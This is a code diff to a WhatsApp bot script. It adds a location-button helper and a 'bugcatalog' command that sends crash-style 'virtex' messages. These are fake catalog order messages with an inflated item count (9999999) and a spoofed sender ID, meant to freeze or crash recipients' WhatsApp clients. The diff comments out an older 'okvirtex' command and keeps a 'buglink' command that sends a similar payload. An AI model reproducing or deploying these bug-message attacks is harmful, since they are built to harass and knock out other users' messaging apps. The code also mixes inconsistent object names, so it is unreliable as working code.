@@ -294,6 +294,20 @@ if (!isCmd && !m.isGroup){
     txt = `${botreply.data.cnt}`
     m.reply(txt)
     }
+	
+///Button Location
+const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
+kma = gam1
+mhan = await xeon.prepareMessage(from, kma, location)
+const buttonMessages = {
+locationMessage: mhan.message.locationMessage,
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: 6
+}
+Nexus.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+}
 
 //////////////////////////////////////////////////////////////////////////////////////
 
@@ -6817,21 +6831,49 @@ case 'add':{
                     })
     break
 		
-case 'okvirtex':
-if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
-katalog(`${ngazap(prefix)}`)
-katalog(`${emoji2(prefix)}`)
-katalog(`${virtex90(prefix)}`)
-katalog(`${virtex2(prefix)}`)
-katalog(`${virtex3(prefix)}`)
-katalog(`${virtex4(prefix)}`)
-katalog(`${virtex5(prefix)}`)
-katalog(`${virtex6(prefix)}`)
-katalog(`${virtex7(prefix)}`)
-katalog(`${virtex8(prefix)}`)
-katalog(`${virtex9(prefix)}`)
-katalog(`${virtag(prefix)}`)
-break
+// case 'okvirtex':
+// if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+// katalog(`${ngazap(prefix)}`)
+// katalog(`${emoji2(prefix)}`)
+// katalog(`${virtex90(prefix)}`)
+// katalog(`${virtex2(prefix)}`)
+// katalog(`${virtex3(prefix)}`)
+// katalog(`${virtex4(prefix)}`)
+// katalog(`${virtex5(prefix)}`)
+// katalog(`${virtex6(prefix)}`)
+// katalog(`${virtex7(prefix)}`)
+// katalog(`${virtex8(prefix)}`)
+// katalog(`${virtex9(prefix)}`)
+// katalog(`${virtag(prefix)}`)
+// break
+case 'bugcatalog':
+if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
+Nexus.toggleDisappearingMessages(from, 0)
+ babi = (teks) => {
+             res = Nexus.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
+  key: {
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+   orderMessage: {
+    itemCount: 9999999, // Bug
+    status: 1,
+    surface: 1,
+    message: `${virtex6(prefix)}`,
+    orderTitle: `${emoji2(prefix)}`, // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+             Nexus.relayWAMessage(res)
+        }
+        babi(`${ngazap(prefix)}`)
+        babi(`${virtag(prefix)}`)
+        babi(`${virtex6(prefix)}`)
+        babi(`${emoji2(prefix)}`)
+        break
+		
 case 'buglink':
               if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
                Nexus.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: `${global.WaterMark}`,
